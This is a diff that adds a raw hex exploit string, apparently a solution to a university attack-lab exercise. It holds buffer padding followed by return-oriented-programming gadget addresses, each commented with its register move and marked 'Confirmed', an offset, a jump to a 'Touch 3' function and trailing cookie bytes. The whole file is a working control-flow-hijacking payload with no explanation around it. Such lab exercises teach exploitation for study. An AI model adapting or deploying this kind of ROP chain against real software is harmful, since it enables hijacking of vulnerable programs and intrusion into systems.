@@ -1,0 +1,19 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+79 1a 40 00 00 00 00 00 /* rsp to rax */. COnfirmed
+e1 19 40 00 00 00 00 00 /* rax to rdi */. Confirmed
+00 1a 40 00 00 00 00 00 /* popq */.       Confirmed
+48 00 00 00 00 00 00 00 /* offset */
+92 1a 40 00 00 00 00 00  /*eax to ecx */. Confirmed
+5e 1a 40 00 00 00 00 00  /*ecx to edx */. COnfirmed
+57 1a 40 00 00 00 00 00  /* edx to esi */. confirmed
+
+1c 1a 40 00 00 00 00 00  /* x+y = eax */. confirmed
+e1 19 40 00 00 00 00 00 /* rax to rdi */. Confirmed
+52 19 40 00 00 00 00 00 /*Touch 3     */. Confirmed
+33 38 31 65 38 33 30 35
